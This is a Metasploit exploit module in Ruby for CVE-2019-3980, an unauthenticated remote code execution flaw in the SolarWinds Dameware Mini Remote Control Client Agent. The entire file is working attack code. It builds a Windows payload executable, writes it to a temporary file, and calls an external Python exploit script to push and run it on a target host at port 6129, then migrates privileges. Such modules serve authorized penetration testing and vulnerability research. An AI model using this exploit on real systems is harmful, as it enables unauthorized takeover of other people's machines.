# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SolarWinds Dameware Mini Remote Control Unauthenticated RCE',
      'Description'    => %q{
          This exploits a RCE vulnerability in any version prior to Dameware 12.0.x HF1 or 12.1 HF3.
        The SolarWinds Dameware Mini Remote Control Client Agent running on the remote host 
        is affected by a remote code execution vulnerability due to improper validation of 
        user-supplied data. An unauthenticated, remote attacker can exploit this, via a series of 
        requests, to execute arbitrary code.        
      },
      'Author'         =>
        [
          'Tenable', # Vulnerability discovery
          'Keith Lee (@keith55), Foregenix' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2019-3980' ]
        ],
      'Privileged'     => true,
      'Platform'       => 'win',
      'Arch'            => [ ARCH_X86, ARCH_X64 ],
      'DefaultOptions' =>
        {
          #'EXITFUNC' => "seh",
          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'
        },
      'Targets'        =>
        [
          [ 'Any version prior to Dameware 12.0.x HF1 or 12.1 HF3', { } ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Oct 08 2019'))

    register_options(
      [
        OptInt.new('TIMEOUT', [true, "The socket connect timeout in milliseconds", 1000]),
        Opt::RPORT(6129)
      ])
    self.needs_cleanup = true
  end

  def exploit
    timeout = datastore['TIMEOUT'].to_i
    peer = "#{rhost}:#{rport}"
    begin
        s = connect(false,
            {
                'RPORT' => "#{rport}",
                'RHOST' => "#{rhost}",
                'ConnectTimeout' => (timeout / 1000.0)
        }
        )
        if (s)
             print_good("#{rhost}:#{rport} - TCP OPEN")
        end

        exe_name = rand_text_alpha(rand(10)+5) + '.exe'
        exe      = generate_payload_exe
    
        tmp = Dir.tmpdir
        temp_file = File.join(tmp, exe_name)

        #print_good("Writing payload to #{temp_file}")
        File.open(temp_file, "wb") do |f|
            f.write(exe)
        end
        register_file_for_cleanup(temp_file)
        rhost = datastore['RHOST']
 
	scriptFile = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2019-3980.py')

        cmd = "python "+scriptFile+" -t "+rhost+" -e "+temp_file
        stdin, stdout, stderr = Open3.popen3("#{cmd}")
        res = stdout.read
        if (res).include?('Received message not')
            print_error("Exploit failed")
        else
            print_good("Exploit ok")
        end
        stdin.close; stdout.close; stderr.close
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        conn = false
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
